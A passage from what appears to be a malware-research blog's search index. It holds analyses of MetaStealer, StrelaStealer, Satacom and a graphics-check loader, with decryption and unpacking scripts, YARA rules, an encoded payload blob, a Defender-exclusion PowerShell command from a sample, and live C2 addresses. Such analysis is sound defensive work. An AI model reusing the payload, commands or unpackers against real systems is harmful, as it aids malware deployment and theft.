PuTWQo0dIhPOWDiKXVTm0VYRxjzJVmrbwGiBCFXHH+oK7v2cNzWSAbqrUt1FLAs6hjMbkGj/VEkdcLPK8Af6xwZuI9nKyCCFZsbOscQ8jhwLR6Bm1pvDDoihvt6hv0SdIejcUvmLRyfbC3GdP4FaiMZ7zzRp6oPbWCRPi2A1SBQrqgHZYE7nnN+ZPUXyWfFW3aX/MPMjfdOno8YGZggRdgxB8SJEOnhp2D3hLY0uCEEVzJfG7pFBqGIjqyYm+f9nPTIXsh5dhpdm7s5wIZj7KcfcB2KypwfQaAN8OcToAiz90sqiVEC1Qkev84lIc7B9bkJ8thK5+2NQ0i2Y+iq2Kiu/LG48NRuj60BMRbqdIyN686YU01aA34WrI+KgCMHuu2b56P8viilUqNrk85Q6jrgIUQIRxLId+JVyb67PTZ23Ije2jICP7RBU+h8QZYokHfPyAvXRqTHp0YKgtnsAAIMbm65vDq8DR/04BDD0J7d7FTt0BCdrn+6ohbVu37GV67lb7qdzEMe3Du8x/7rNSQQDh+dzby2FYHRkjbVy2TIndod1CZNRD/iv8JyS6FEbdI4mX+M6IkI4idXZA0uRJEr3e7wHRMqbEnmVt44fd/dPtedEpcxZGUYzKxOBu1j81vwKXU/4iM/je/96N2aqI7KswF+QuH9PslUGAuAUJ9b9hoOZfiuHl/iw+otMEiyrnNv/cPNpq6SbViMT1/hM1/N1Y2z6/8TM9/jZpg/hfezwyO2VpsCbZavy4/GQ7WIu+X+kq4H7+D7Y8SlW/Fh93APbOf49F//L/EsjDlUb+7l+IOsH0pwJrj6dSSD7gO4yN8Xsl+K1Opml1DMx/u6af/WCDfz9Xs9xOvvCEPP1il5+W5UsKqk03yy/eiLF9WaRmR+1w+M8W1W3S50+0YOY/xm+d/I+31Lr137A+EAhKRwRo8PAy88Nw3uosY8Yli57NzWgGHFLWqQUhEteU1vrpashh6WR+gfCZd/Y7F+WN/ckuMl2MKU8DbyfgtNCJ4Y3rj1F4lF9JMyjQSosowR8Sm1n+kAUSM2ts28/Oa9Yx9ZnlO9OlBKL53fsz6msOb3QQhgF/NgiTu+bDY3I+2Ar/+j//+yWRfY7vXfufkQt3Uwq1j+u3kwnY6fcekb1RfA+mwUbelf+hXikYs7IxAPelD4+t59Oqrh3tXfxhvPLCchdWWxyg89AzYsv1kHrew722838XlHeEBVGpA9oWNtqfzg09OGTacoYZt8tQ0ofz3pj72Rf1d7uCoCsQ0lOHTY3c/fA5Am2//Ricc1T7i94sI66eopqPJd1LrOpRkxulXry+6GiyYq7T59HE9mM0RebmiJJ5sQyQrc++0AQsCW9/elZ1GyAUuw2XSvyfWt+Wi4c7m+qqj+F6r5Yv72831kot1U0b0A21uP4SM57/qwnjl82D5We6n7nG0p6U4yWrpbB3WjbSUNpVsQKeeGd8mcxc/JBMAk97EvIrACA4uQZd0K8gDjYz2zaaa7x0KYzqEX2WCDbVmpnUl4Eybao+DPbkwkJ1jgWCfC9vtQZdg2GuMIv/JzkT7T+DDkMIRsRA0eAg+MyDWcj+Z3A2qHUneWFvoI88J8b2mrxCD/UK5GOG+vzIx5w10ZFnLLm7PuyJcYOQt5ftb2DP7IY/zibNHBwCJp8ItHO9D+OghYtnzW0YEp4Y8eubV3k76eDkKaKY+K/S8XEWCeDQoN6p4N9UcqE5sSxKCDsaRdsMtyFdl6/AR2z50LrXGxlY+rVH2dKJVHwgBOZ/DTWE5BpHWb8+36AScYlfuPbjmK6NEEStRZt/uel5UQPqLA9pfp95bGNr5yHuRc/MldnUy7xfH3w9/9//d7//Nd37XWFKPbJP&quot; s1 = cipher(data, &#39;kdvbp&#39;, False) s2 = base64.b64decode(s1) out = gzip(s2) open(&#39;/tmp/payload.bin&#39;,&#39;wb&#39;).write(out) . 143872 . Shellcode Analysis . from dumpulator import Dumpulator dp = Dumpulator(&quot;/tmp/shellcode.dmp&quot;, quiet=True) shell_start = 0x0000000000190000 print(&quot;loaded&quot;) . loaded . api_fn_offset = 0x0145E9 api_fn = shell_start + api_fn_offset api_addr = dp.call(api_fn, [5, 0x57C11E5BCC7B9CB4, 0x0FF45B9236F36849]) print(dp.modules.find(api_addr).find_export(api_addr).name) . VirtualAlloc . def get_api(hash_value): api_fn_offset = 0x0145E9 api_fn = shell_start + api_fn_offset api_addr = dp.call(api_fn, [5, hash_value, 0x0FF45B9236F36849]) return dp.modules.find(api_addr).find_export(api_addr).name . get_api(0x5ABC026841136F5D) . &#39;LoadLibraryA&#39; . decrypt_offset = 0x001479D decrypt_fn = shell_start + decrypt_offset ret = dp.call(decrypt_fn, [shell_start + 5 + 1, shell_start + 5 + 5, shell_start + 5 + 144, dp.read_long(shell_start + 5) - 576]) . dp.read(shell_start + 5 + 144 + (8*141), 1 ) . bytearray(b&#39;o&#39;) . . b&#39;M x90&#39; .",
            "url": "https://research.openanalysis.net/asyncrat/amsi/anti-detection/2023/05/28/amsifun.html",
            "relUrl": "/asyncrat/amsi/anti-detection/2023/05/28/amsifun.html",
            "date": " ‚Ä¢ May 28, 2023"
        }
        
    
  
    
        ,"post5": {
            "title": "Metastealer",
            "content": "Overview . This is a stealer that has been in operation since atleast May 2022. Recent versions have added a DGA! . References . MetaStealer: String Decryption and DGA overview | Metastealer ‚Äì filling the Racoon void | IOCs from Unit42 | . Sample . 6cf8bfba1b221effcb1eccec0c91fb0906d0b8996932167f654680cb3ac53aacUnpacMe | . Analysis . This sample has many strings related to the build process that have not been stripped. We can use these for our yara rule. . &quot;powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension &quot;exe &quot;&quot;, . C: Workspace Projects rat client stealer third_party C: Workspace Projects rat client stealer out build x86-Releaseird_party cryptopp _deps cryptopp rijndael_simd.cpp stealertest.dll IBrowserBase@stealer ChromeBrowser@stealer EdgeBrowser@stealer FirefoxBrowser@stealer . This sample looks similar maybe an earlier version 5e5cc4f42c7d5481db280b28d1227568c17ed8cc4208970b7a963a4f30c7cc83 . C: 3001_1 notbotnet client stealer out third_party cryptopp C: 3001_1 notbotnet client stealer third_party stealertest.dll . Yara Rule . rule metastealer_dga { strings: $libs = &quot;rat client stealer&quot; ascii wide $rtti_1 = &quot;IBrowserBase@stealer&quot; $rtti_2 = &quot;ChromeBrowser@stealer&quot; $rtti_3 = &quot;EdgeBrowser@stealer&quot; $rtti_4 = &quot;FirefoxBrowser@stealer&quot; $name = &quot;stealertest.dll&quot; condition: $name or all of ($rtti_*) or $libs } . String Decryption . This is a modified version of Jason Reeves&#39; script from his blog . &#39;&#39;&#39; rule meta_s { meta: author = &quot;sysopfb&quot; strings: $snippet1 = {66 0? ef} $snippet2 = {c5 ?? ef} condition: ($snippet1 or $snippet2) } &#39;&#39;&#39; import re file_data = open(&#39;/tmp/metastealer.bin&#39;, &#39;rb&#39;).read() offsets = [] string_egg = rb&#39; x66[ x00- x0f] xef&#39; for m in re.finditer(string_egg, file_data, re.DOTALL): offsets.append(m.start()) ret = [] out = None length_off = False prev_offset = 0 for offset in offsets: test = file_data[prev_offset:offset] vals = re.findall(b&#39;&#39;&#39; xc7 x85.. xff xff....&#39;&#39;&#39;,test) if vals != []: if len(vals) &gt; 8: temp = vals[-8:] else: temp = vals try: xdata = temp[0][-4:] xdata += temp[1][-4:] xdata += temp[2][-4:] xdata += temp[3][-4:] xkey = temp[4][-4:] xkey += temp[5][-4:] xkey += temp[6][-4:] xkey += temp[7][-4:] xdata = bytearray(xdata) xkey = bytearray(xkey) for i in range(len(xdata)): xdata[i] ^= xkey[i] tmp_str = b&#39;&#39;.join(xdata.split(b&#39; x00&#39;)) if tmp_str.isascii(): print(tmp_str) except: pass prev_offset = offset . b&#39;sys&#39; b&#39;chrome&#39; b&#39;chrome&#39; b&#39;chrome&#39; b&#39;chrome&#39; b&#39;chrome&#39; b&#39;chrome&#39; b&#39;chrome&#39; b&#39;chrome&#39; b&#39;chrome&#39; b&#39;ip&#39; b&#39;ip&#39; b&#39;ip&#39; b&#39;cmd&#39; b&#39;cmd&#39; b&#39;FG Started&#39; b&#39;chrome&#39; b&#39;chrome&#39; b&#39;chrome&#39; b&#39;chrome&#39; b&#39;chrome&#39; b&#39;ok&#39; b&#39;ok&#39; b&#39;ok&#39; b&#39;ok&#39; b&#39;ok&#39; b&#39;:1775&#39; b&#39;:1775&#39; b&#39;ok&#39; b&#39;ok&#39; b&#39;/api/client/new&#39; b&#39;ok&#39; b&#39;ffox&#39; b&#39;dir=in &#39; b&#39;version&#39; b&#39;.xyz&#39; b&#39;ok&#39; b&#39;os_crypt&#39; b&#39;os_crypt&#39; b&#39;RtlGetVersion&#39; b&#39;RtlGetVersion&#39; b&#39;Windows 10&#39; b&#39;Windows 10&#39; b&#39;Windows 10&#39; b&#39;Windows 10&#39; b&#39;Windows 10&#39; b&#39;Windows 10&#39; b&#39;Pro&#39; b&#39;action&#39; b&#39;action&#39; b&#39;action&#39; b&#39;action&#39; b&#39;action&#39; b&#39;uuid&#39; b&#39;uuid&#39; b&#39;ok&#39; b&#39;files&#39; b&#39;files&#39; b&#39;files&#39; b&#39;files&#39; b&#39;files&#39; b&#39;files&#39; b&#39;files&#39; b&#39;files&#39; b&#39;files&#39; b&#39;files&#39; b&#39;files&#39; b&#39;files&#39; b&#39;/tasks/collect&#39; b&#39;status&#39; b&#39;uuid&#39; b&#39;uuid&#39; b&#39;uuid&#39; b&#39;/tasks/collect&#39; b&#39;status&#39; b&#39;status&#39; b&#39;status&#39; b&#39;status&#39; b&#39;/tasks/collect&#39; b&#39;ROOT&#39; b&#39;name&#39; b&#39;name&#39; b&#39;name&#39; b&#39;value&#39; b&#39;host_key&#39; b&#39;host_key&#39; b&#39;host_key&#39; b&#39;host_key&#39; b&#39;host_key&#39; b&#39;host_key&#39; b&#39;host_key&#39; b&#39;host_key&#39; b&#39;host_key&#39; b&#39;domain&#39; b&#39;domain&#39; b&#39;path&#39; b&#39;path&#39; b&#39;path&#39; b&#39;path&#39; b&#39;path&#39; b&#39;host&#39; b&#39;isHttpOnly&#39; b&#39;path&#39; b&#39;isSecure&#39; b&#39;expiry&#39; b&#39;name&#39; b&#39;value&#39; b&#39;domain&#39; b&#39;domain&#39; b&#39;path&#39; b&#39;path&#39; b&#39;path&#39; b&#39;name&#39; b&#39;value&#39; b&#39;origin_url&#39; b&#39;origin_url&#39; b&#39;origin_url&#39; b&#39;url&#39; b&#39;url&#39; b&#39;url&#39; b&#39;ntdll&#39; b&#39;Uuid&#39; b&#39;File-Type&#39; b&#39;files&#39; b&#39;cmd.exe&#39; b&#39;cmd.exe&#39; b&#39;cmd.exe&#39; b&#39;H x07 x01 x01&#39; b&#39; x02 x01&#39; b&#39; x01 x02 x01 x02 x02 x01&#39; b&#39; x02 x08 x02 x03 x03&#39; b&#39;&#39; b&#39; x0f&#39; b&#39;a x06 x01 x10 x18&#39; . DGA . We want to statically extract the DGA seed. . 68 EF 06 00 00 push 1775 89 85 84 FD FF FF mov [ebp-27Ch], eax 8D 85 F0 FD FF FF lea eax, [ebp-210h] 68 34 12 00 00 push 1234h . import re import struct seed_egg = rb&#39; x68 xEF x06 x00 x00.{6,16} x68(.. x00 x00)&#39; for m in re.finditer(seed_egg, file_data, re.DOTALL): tmp_seed = struct.unpack(&#39;&lt;I&#39;, m.group(1))[0] print(hex(tmp_seed)) . 0x1234 .",
            "url": "https://research.openanalysis.net/metatealer/stealer/dga/obfuscation/2023/05/11/metastealer.html",
            "relUrl": "/metatealer/stealer/dga/obfuscation/2023/05/11/metastealer.html",
            "date": " ‚Ä¢ May 11, 2023"
        }
        
    
  
    
        ,"post6": {
            "title": "StrelaStealer",
            "content": "Overview . This is an email stealer that has been in operation since at least November 2022. The stealer is simple, it collects emails from the target and uploads them to a hard coded C2. . Recent versions have been signed, and there are both 32-bit and 64-bit variants. . . New versions pop up a message box in Spanish that attempts to trick the user into thinking the program did not execute correctly. . El archivo est ... . &gt; https://twitter.com/seanmw/status/1654504780339859456?s=20 Earlier versions of this malware also appeared to target Spanish speaking victims based on the decoy documents that were dropped along with the delivery of the malware. . . References . @seanmw new version of StrelaStealer | #ShortAndMalicious: StrelaStealer aims for mail credentials | New StrelaStealer Malware Steals Your Outlook, Thunderbird Accounts | CRT docs | . Samples . be9f84b19f02f16b7d8a9148a68ad8728cc169668f2c59f918d019bce400d90e (older) unpacme | 8b0d8651e035fcc91c39b3260c871342d1652c97b37c86f07a561828b652e907 (older) unpacme | 3b3f2a92db0f19e96ba8a729709e357419e1aba1ccd48244f34fb74cc621ed51 (obfuscated) unpacme | 61118d0f778c2f9b3a2bb3e37176ba6a13ee266c49b89dab7e187129f5c00887 (new 32-bit) unpacme | fbcfed6900eadd7d36a169400bfcc65a56778cf51152fa8cea0b74daa6cbcd60 (new 64-bit) unpacme | . Analysis . Sample - November 2022 . be9f84b19f02f16b7d8a9148a68ad8728cc169668f2c59f918d019bce400d90e . Wed Nov 2 08:50:41 2022 UTC . String Decryption . The strings are encrypted with XOR using a hard coded key that resembles a GUID 4f3855aa-af7e-4fd2-b04e-55e63653d2f7 . key = b&#39;4f3855aa-af7e-4fd2-b04e-55e63653d2f7&#39; data = bytes.fromhex(&#39;4712415d595400&#39;) def xor(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) xor(data, key) . b&#39;strelaa&#39; . table = bytes.fromhex(&#39;46135d5c595952530d4343444701671216574103570b57181a5641125900144345404703005548421211160f681e1d485153000068155f5b1b510d0d46135d5c5959525303041e521115164b695e0418194f02551115164b69590e06440f15190f5e5b0868325b4d5b5104134f081453397d4609025b41074368000011151f1d46194412270000007d2b7268156500125e160945010000007d2b7268156012045f0000007d2b7268156604135b0414006729756c62743324712c0f54174247090246712d56520c4e506954001d06697c11460a585b0d6f68475a07084104156b2a58400a0b5d463e09075218767323060707060255030204765e0b790505505119235476531b0350380000006429606c7f2e00007b2a0000722000001b15564a4350134f5d091600790949515959004e184f56174d7a5d08005d5a11107a310d04054b060816625a0a04520c141e050c1c1520115d0d0360004f7f0f101d1851071a561b151d2e7e677b791f445e0f5c5146745d565e0e480d220e450a405149520203521e07541c071b5407001666520253145e1b53000f1b065700055f00160405574f1c585719541b02004712415d595400000000000000000000&#39;) for s in table.split(b&#39; x00&#39;): if len(s) == 0: continue try: tmp_str = xor(s, key) if tmp_str.isascii(): print(tmp_str) except: pass . b&#39;rundll32 &#34;%s&#34;,Strelag?25/c$$j&#39; b&#39; %vxr6&#39; b&#39;a.q*$#n t3|.f6&#39; b&#39; slc.dllkr;k&lt;tf5g630!!sf ka.*y7fu &#39;p|]?=&gt;q:tx&#34;?=? r x1fo+?c)q x7f&lt;q~ x0cH#?1mt4 &#39;Z&#39; b&#39;%s,%s,%s n&#39; b&#39;IMAP P&#39; b&#39;&amp;8%1p4&#39; b&#39;IMAP User&#39; b&#39;IMAP Server&#39; b&#39;SOFTWARE Microsoft Office 1&#39; b&#39;)`ZD$sk9vl t_&#34;w3n%68 t x1al% &#39;&gt;h# x08:1g+ x12AE13a5:`6ce[?mN`(d7} x11y x14c/f} r&#39; b&#39;POSTJ x1b&#39; b&#39;OL&#39; b&#39;FF&#39; b&#39;/server.php&#39; b&#39;Mozill&#39; b&#39;z~|n&#34;x x1b&lt;%&#39; b&#39;i&lt;&#34;(O x04le(*`?sOnl``!v.1i1 x15tk&gt;5U&#39; b&#39;{ x19&lt;((-0f77}&#34;x x03J x01 x1fK2&amp;n;9|sA8`m8}&gt;F&lt;#=t7zj763 x7f*5z0~y3&#39; b&#39;&#34; x00a:f!?z~&#39; b&#39;;}5o&#39; b&#39;19&#39; b&#39;&#34;b6oz)9645}5&#39; b&#39;strela&#39; . IDA String Decrypt . The following can be used to highlight and decrypt strings in IDA. . key = b&#39;4f3855aa-af7e-4fd2-b04e-55e63653d2f7&#39; def xor(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) start = idc.read_selection_start() end = idc.read_selection_end() if idaapi.BADADDR in (start, end): ea = idc.here() start = idaapi.get_item_head(ea) end = idaapi.get_item_end(ea) data = idc.get_bytes(start, end - start).encode(&#39;hex&#39;) out = xor(data, key) print(out) . Hot-key Bind. . import ida_expr import ida_kernwin import idc import ida_bytes import ida_kernwin ida_expr.compile_idc_text(&#39;static n_key() { RunPythonStatement(&quot;nopping()&quot;); }&#39;) ida_kernwin.add_idc_hotkey(&quot;Alt-N&quot;, &quot;n_key&quot;) . C2 Comms . The harvested data is sent to the following hard coded C2 with a POST request. . http[:]//193.106.191[.]166/server.php . Decoy . The payload expects a x.pdf file to be present in the launch directory at runtime. This pdf is launched by the malware as a decoy to trick the user into thinking they have only opened a PDF not launched an executable. The PDF is not dropped by the payload, instead the payload relies on the previous stage to deploy the PDF. This directly ties the payload to delivery stage which is unusual for malware that is sold, and indicates that this malware is both developed and operated by the same actor. . cmd /c start msedge x.pdf . Sample - April 2023 . 61118d0f778c2f9b3a2bb3e37176ba6a13ee266c49b89dab7e187129f5c00887 . Sun Apr 2 22:42:15 2023 UTC . Updates . All strings are now plaintext | The decoy has been simplified to launch an error message box rather than a PDF | PE file not a DLL | The C2 comms are still encrypted with a hard coded XOR string 7a7dd62b-c4ea-4bbb-9f3f-2e6d58aada40 | . C2 . http[:]//91[.]215.85.209/server.php . Decoy . The new &quot;decoy&quot; no longer requires a PDF instead a message box is launched that says... . El archivo est√° da√±ado y no se puede ejecutar . Translated from Spanish this reads The file is damaged and cannot be executed, an attempt to trick the user into thinking they can&#39;t open the lure. Based on the use of Spanish they are still targeting Spanish victims. . PDB Tracking . The following PDB paths have been found in versions of Strela. . C: Users Serhii Documents Visual Studio 2008 Projects StrelaDLLCompile Release StrelaDLLCompile.pdb C: Users admin source repos Dll1 Release Dll1.pdb C: Users Serhii Documents Visual Studio 2008 Projects dll1 Release dll1.pdb C: Users Serhii source repos WindowsProject1 x64 Release WindowsProject1.pdb . Pivoting from these PDB paths and searching through public malware repositories related samples have been recovered indicating that the developer has been working on similar projects since at least 2022-01-23 21:58:42 (sample d091cb30b4c19b24249af2648d8c43abd5390118d502b5041b5d89d2152a0d7a). . Malware in Development . Some related samples are not malware but rather test code apparently used to test features in development. These include a sample 2F3A2B18252E39C5B95A199412D97916E6E2611F3A83EF7160E74AA959A41933 that appears to be some type of putty.exe launcher using the local path C: Users Serhii Downloads putty.exe. . C2 Tracking . Performing a revers lookup for the C2 IP 91.215.85[.]209 the following domains have been registered and point to this IP. It is unclear what their purpose is. . posts-fi[.[com carrefours-tw[.]com directeredie[.]org dkpostnord[.]com fornying-skonto[.]com redisimple[.]com chunghwa-post[.]app atuh-manor[.]com post-chunghwa-tw[.]app post-chunghwa-tw[.]com tibouton[.]org carrefour-tw[.]com post-tw[.]app .",
            "url": "https://research.openanalysis.net/strelastealer/stealer/2023/05/07/streala.html",
            "relUrl": "/strelastealer/stealer/2023/05/07/streala.html",
            "date": " ‚Ä¢ May 7, 2023"
        }
        
    
  
    
        ,"post7": {
            "title": "Satacom (LegionLoader)",
            "content": "Overview . This loader is strongly associated with the NullMixer pay-per-install service which uses SEO poisoning to place it&#39;s loader in high ranked Google searches. According to a Kaspersky post about NullMixer the SEO poisoned terms often relate to ‚Äúcracks‚Äù and ‚Äúkeygens‚Äù. . The LegionLoder (aka Satacom) itself is used to deliver malware payloads but also contains a built-in crypto stealer detailed in this DeepInstinct post. . References . Untangling Legion Loader‚Äôs Hornet Nest of Malware | NullMixer: oodles of Trojans in a single dropper | . Samples . packed ddc2b05410808c6a42584aec972332a8e7ca155cb7dcad4fb68167d39130ce09 UnpacMe . unpacked 2ff7169de9b8737c232ef3410736167129a02ffe3cbb953e528fb88c8f665660 | . | packed 0302f9e68aba7f9c2e9a80d959431b68eab2991e9489887fca727c2a3d493bff UnpacMe . unpacked cc1087c4b35d8e6a4f1b88c2eaf0870b7630e53bad8d188283543a3df312188d | . | packed 296a4593d0619126d9b6dc61dcc9c608699ae89af1849378ec3d9347795a0db1UnpacMe . unpacked 8fbf21e9ecaa64b8f71904791380a3efa08f71f18f18fc9f7e171de2c5a946fc | . | . String Decryption (hex strings) . hex decode | rc4 decrypt with hard coded key | . from malduck import rc4 key = bytes.fromhex(&#39;f74b76852a9cbfd407365cfdcf2ead7e9e483d51865a585ed17ec67e620b3c3a&#39;) data = &#39;759e021374ebbd9ed98899a2&#39; enc_data = bytes.fromhex(data) rc4(key, enc_data) . b&#39;gate2.php?a=&#39; . ss = [&#39;2ad14e587eebf5&#39;, &#39;7691055b24a0ac85dd999bf00e02&#39; ,&#39;7a96020223b6b9d8d9df88&#39; ,&#39;348f170f29b0b9cb999bcb&#39; ,&#39;759e021374ebbd9ed98899a2&#39;] for s in ss: enc_data = bytes.fromhex(s) print(enc_data | refinery.rc4(key) | bytes) . b&#39;8.8.8.8&#39; b&#39;dns-beast.com x00&#39; b&#39;hittest.php&#39; b&#39;&amp;payout=0,3&#39; b&#39;gate2.php?a=&#39; . Binary Refinery Decrypt . Attempt to perform the same decryption with binary refinery. . import refinery enc_data | refinery.rc4(key) | bytes . b&#39;gate2.php?a=&#39; . String Decryption (base64 strings) . base64 decode | xor decrypt with stack string | . import base64 from malduck import xor b64_string = &#39;c21pZXt/cw==&#39; enc_str = base64.b64decode(b64_string) xor(b&#39;KCQ&#39;, enc_str) . b&#39;8.8.8.8&#39; . Dumpulator Decrypt . Attempt to perform the same decryption with dumpulator. . from dumpulator import * def main(): dp = Dumpulator(&quot;/tmp/2ff-malware.dmp&quot;, trace=False, debug_logs=False, quiet=True) init_function = 0x4056E0 map_ptr = dp.call(init_function) print(f&quot;string map: {hex(map_ptr)}&quot;) decrypt_function = 0x401270 buf_ptr = dp.allocate(1024) for i in range(6): dp.call(decrypt_function, [i, buf_ptr], regs={&#39;rcx&#39;: map_ptr}) print(dp.read_str(buf_ptr)) if __name__ == &quot;__main__&quot;: main() . string map: 0xbb75e8 8.8.8.8 dns-beast.com Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; rv:11.0) like Gecko hittest.php &amp;payout=0,3 gate2.php?a= . Packer . The packer uses many obfuscation techniques to prevent detection of its stub including the addition of junk API calls. . IDA Python NOP Patch . To remove the packer junk code we can use the following script. Simply highlight the junk code and run the script to replace it with null bytes. . import idaapi _, start, end = idaapi.read_range_selection(None) for ea in range(start, end): idaapi.patch_byte(ea, ord(&#39; x90&#39;)) . Packer ID . Thanks to mishap for the IOC. The following binary string can be used to locate packers that have a hard coded payload size that matches the samples analyzed. NOTE this is only useful for finding packers with the same payload (for further research) and is not a generic IOC for this packer. . {C7 05 ?? ?? ?? ?? E0 0E 00 00} . Many of the samples also include the PE metadata which identify the payload name as fork5.dll. This is another IOC that can be used to identify one version of the packer. It is not a generic IOC for this packer. .",
            "url": "https://research.openanalysis.net/satacom/legionloader/loader/nullmixer/2023/04/30/satacom.html",
            "relUrl": "/satacom/legionloader/loader/nullmixer/2023/04/30/satacom.html",
            "date": " ‚Ä¢ Apr 30, 2023"
        }
        
    
  
    
        ,"post8": {
            "title": "in2al5dp3in4er Loader",
            "content": "Overview . This new? loader was exposed by Morphisec. According to the post, the loader is compiled with Embarcadero RAD Studio and employs a graphics card check to ensure it is not running in a sandbox before deploying its embedded payload (the loader). The loader is simply used to download and execute a final payload (main functionality). . References . WHAT MAKES INVALID PRINTER LOADER SO STEALTHY? | @osipov_ar tweet | . Samples . 66383d931f13bcdd07ca6aa50030968e44d8607cf19bdaf70ed4f9ac704ac4d1 UnpacMe | . Analysis . data = open(&#39;/tmp/blob.bin&#39;, &#39;rb&#39;).read() out = [] for i in range(len(data)): tmp = data[i] tmp = (tmp - 52) &amp; 0xff tmp ^= 0x55 tmp = (tmp + i - 18) &amp; 0xff out.append(tmp) out = bytes(out) out[:100] open(&#39;/tmp/out.bin&#39;,&#39;wb&#39;).write(out) . 3168770 . Aurora Stealer . The extracted 2nd stage is the golang stealer sold as &quot;Aurora Stealer&quot; malpedia. . 21545028cac12fc9e8692a71247040718e6d640ee6117d1b19f4521f886586beUnpacMe . Packer ID . We can make a simple yara rule based on the following . riid for CreateDXGIFactory call . EC 66 71 7B C7 21 AE 44 B2 1A C9 AE 32 1A E3 69 . imports . CreateDXGIFactory from DXGI.dll . checks . cmp eax, 887A0002h 3D 02 00 7A 88 . gfx whitelist ids . {29 9? 01 00} . Rule . import &quot;pe&quot; import &quot;math&quot; rule riid_hunt { strings: $riid = { EC 66 71 7B C7 21 AE 44 B2 1A C9 AE 32 1A E3 69 } $embarcadero = &quot;This program must be run under Win32&quot; ascii $import = &quot;CreateDXGIFactory&quot; ascii wide condition: all of them and for any i in (0..(pe.number_of_sections)-1) : ( pe.sections[i].name == &quot;.data&quot; and math.entropy(pe.sections[i].raw_data_offset, pe.sections[i].raw_data_size) &gt;= 7 ) } . Unpacking . 48 8D 05 9A 94 16 00 lea rax, blob 48 B9 EE EE DE DD CD CC BB 0A mov rcx, 0ABBCCCDDDDEEEEEh 48 BA 55 55 45 44 34 23 12 00 mov rdx, 12233444455555h 49 B8 CC CC B3 BB A2 1A 00 00 mov r8, 1AA2BBB3CCCCh 4C 63 4D E0 movsxd r9, [rbp+var_20] . 48 8D 05 D1 93 16 00 lea rax, blob 48 B9 81 FD A9 98 F6 50 00 00 mov rcx, 50F698A9FD81h 48 BA 1B 06 AC 5D DE F8 ED 00 mov rdx, 0EDF8DE5DAC061Bh 49 B8 04 68 7C AA 99 9D 0B 00 mov r8, 0B9D99AA7C6804h 4C 63 4D E8 movsxd r9, [rbp+var_18] . import re import struct import pefile file_data = open(&#39;/tmp/pointer.bin&#39;, &#39;rb&#39;).read() pe = pefile.PE(data=file_data) crypto_egg = rb&#39; x48 x8D x05(....) x48 xB9(.)....... x48 xBA(.)....... x49 xB8(.)....... x4C&#39; match = re.search(crypto_egg, file_data, re.DOTALL) assert match is not None match_offset = match.start() payload_offset = struct.unpack(&#39;&lt;i&#39;, match.group(1))[0] match_rva = pe.get_rva_from_offset(match_offset) blob_rva = match_rva + 7 + payload_offset blob_offset = pe.get_offset_from_rva(blob_rva) add_inc_key = struct.unpack(&#39;B&#39;, match.group(2))[0] xor_key = struct.unpack(&#39;B&#39;,match.group(3))[0] add_key = struct.unpack(&#39;B&#39;,match.group(4))[0] print(f&quot;add_inc_key: {hex(add_inc_key)}&quot;) print(f&quot;xor_key: {hex(xor_key)}&quot;) print(f&quot;add_key: {hex(add_key)}&quot;) print(f&quot;blob_rva: {hex(blob_rva)}&quot;) print(f&quot;blob_offset: {hex(blob_offset)}&quot;) . add_inc_key: 0xee xor_key: 0x55 add_key: 0xcc blob_rva: 0x172ef0 blob_offset: 0x171af0 . tmp_data = file_data[blob_offset:] blob_data = tmp_data.split(b&#39; x00 x00 x00 x00&#39;)[0] blob_data[:100].hex() . &#39;3e72298e788c7992939091868485858a0c8889dedfdcdde2a3e0e1d6d7d4d5dadbd8d9eeefecedf2f3f0f1e6e7e4e5eaebe8e9bebfbcbdc2c3c0c1b637b4b5bae9d913bccf08b401f208d07afae781b2b295e9ae99adaaac82a7c18376aaababa7b87b75&#39; . def decrypt(data, key1, key2, key3): out = [] for i in range(len(data)): tmp = data[i] tmp = (tmp + key1) &amp; 0xff tmp ^= key2 tmp = (tmp + i + key3) &amp; 0xff out.append(tmp) out = bytes(out) return out out = decrypt(blob_data, add_key, xor_key, add_inc_key) tmp_pe = pefile.PE(data=out) pe_size = pe.sections[-1].PointerToRawData + pe.sections[-1].Misc_VirtualSize final_pe = out[:pe_size] open(&#39;/tmp/testpe.bin&#39;, &#39;wb&#39;).write(final_pe) . 3114235 . def extract(file_path): file_data = open(file_path, &#39;rb&#39;).read() pe = pefile.PE(data=file_data) crypto_egg = rb&#39; x48 x8D x05(....) x48 xB9(.)....... x48 xBA(.)....... x49 xB8(.)....... x4C&#39; match = re.search(crypto_egg, file_data, re.DOTALL) assert match is not None match_offset = match.start() payload_offset = struct.unpack(&#39;&lt;i&#39;, match.group(1))[0] match_rva = pe.get_rva_from_offset(match_offset) blob_rva = match_rva + 7 + payload_offset blob_offset = pe.get_offset_from_rva(blob_rva) add_inc_key = struct.unpack(&#39;B&#39;, match.group(2))[0] xor_key = struct.unpack(&#39;B&#39;,match.group(3))[0] add_key = struct.unpack(&#39;B&#39;,match.group(4))[0] tmp_data = file_data[blob_offset:] blob_data = tmp_data.split(b&#39; x00 x00 x00 x00&#39;)[0] out = decrypt(blob_data, add_key, xor_key, add_inc_key) assert out[:2] == b&#39;MZ&#39; tmp_pe = pefile.PE(data=out) pe_size = pe.sections[-1].PointerToRawData + pe.sections[-1].Misc_VirtualSize final_pe = out[:pe_size] open(file_path+&#39;_extracted.bin&#39;, &#39;wb&#39;).write(final_pe) . # import required module import os # assign directory directory = &#39;/tmp/samples&#39; # iterate over files in # that directory for filename in os.listdir(directory): f = os.path.join(directory, filename) # checking if it is a file if os.path.isfile(f): try: print(f) extract(f) except: continue . /tmp/samples/66383d931f13bcdd07ca6aa50030968e44d8607cf19bdaf70ed4f9ac704ac4d1 /tmp/samples/.DS_Store /tmp/samples/a4cab01d61d8c18876d4b53d52de365fb9b512430371fd4217359159f3c507f6 /tmp/samples/66383d931f13bcdd07ca6aa50030968e44d8607cf19bdaf70ed4f9ac704ac4d1_extracted.bin /tmp/samples/5e4b6272dc2d955c5e52c755ea598f44e324b04466a4e3bacf6c9d845345322b /tmp/samples/cdb09a5df36fece23bc3c9df101fe65724327b827ec43aa9ce0b3b76bdcc3101 /tmp/samples/2c540f5220b7ba3cd6efcd2fe8091fc24f8da11be4b1782c4e502261ef48da82 .",
            "url": "https://research.openanalysis.net/in2al5dp3in4er/loader/analysis/sandbox/invalid%20printer/2023/04/23/in2al5dp3in4er.html",
